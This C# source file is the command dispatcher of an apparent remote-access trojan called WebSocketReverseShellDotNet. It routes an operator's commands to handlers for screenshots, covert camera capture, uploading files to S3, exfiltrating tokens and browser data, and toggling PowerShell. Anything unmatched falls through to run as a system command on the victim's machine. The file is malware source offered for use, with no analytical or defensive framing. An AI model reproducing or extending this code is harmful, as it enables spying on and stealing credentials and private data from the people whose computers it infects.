using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;
using WebSocketReverseShellDotNet.service.commands;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.factory
{
    internal class CommandFactory
    {
        public static Command createCommand(String command)
        {
            List<String> commands = DataManuplationUtil.StringToList(command, " ");

            String firstArgument = commands[0].ToLower();

            Dictionary<string, Command> commandsList = new Dictionary<string, Command>(StringComparer.OrdinalIgnoreCase);
            commandsList.Add("cd", new ChangeDirectoryCommand());

            if (command.Equals("powershell", StringComparison.OrdinalIgnoreCase))
            {
                commandsList.Add("powershell", new TogglePowerShellCommand());
            }
            commandsList.Add("upload", new UploadToS3());
            commandsList.Add("/screenshot", new ScreenShot());
            commandsList.Add("/camerashot", new CameraScreenShot());
            commandsList.Add("/tokens", new TokenExfiltereter());
            commandsList.Add("/browser", new BrowserExfelterator());
            commandsList.Add("/??", new HelpCommand());
            commandsList.Add("/exit", new Terminate());
            // If not found, redirect to the system command
            return commandsList.TryGetValue(firstArgument, out Command value)
                ? value
                : new SystemCommand();
        }
    }
}
